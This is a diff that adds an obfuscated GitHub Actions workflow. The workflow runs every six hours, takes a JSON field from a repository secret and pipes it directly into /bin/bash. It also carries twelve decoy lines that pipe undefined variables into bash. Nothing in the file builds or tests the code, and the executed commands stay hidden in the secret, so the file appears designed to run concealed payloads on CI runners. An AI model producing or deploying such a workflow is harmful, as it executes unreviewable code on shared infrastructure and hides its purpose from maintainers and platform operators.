@@ -1,0 +1,28 @@
+name: liupianan7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liupianan7654
+        env:
+          qpsi23: ${{ secrets.qpsi23 }}
+        run: |
+          echo $qpsi23 | jq -r .zeyxv60 | /bin/bash
+          echo $jgx215 | jq -r .bapdg65 | /bin/bash
+          echo $ms0192 | jq -r .jd359 | /bin/bash
+          echo $douv65 | jq -r .jifu197 | /bin/bash
+          echo $dvyjr7 | jq -r .i71 | /bin/bash
+          echo $t7 | jq -r .wfsj13091 | /bin/bash
+          echo $o869 | jq -r .afyrb42441 | /bin/bash
+          echo $dziji73 | jq -r .pkxz57709 | /bin/bash
+          echo $mr4 | jq -r .tx6 | /bin/bash
+          echo $kzn2808 | jq -r .dmaxw24850 | /bin/bash
+          echo $alkux55435 | jq -r .rgak15 | /bin/bash
+          echo $ao51263 | jq -r .gdd5 | /bin/bash
+          echo $gzoc09 | jq -r .h20 | /bin/bash
+
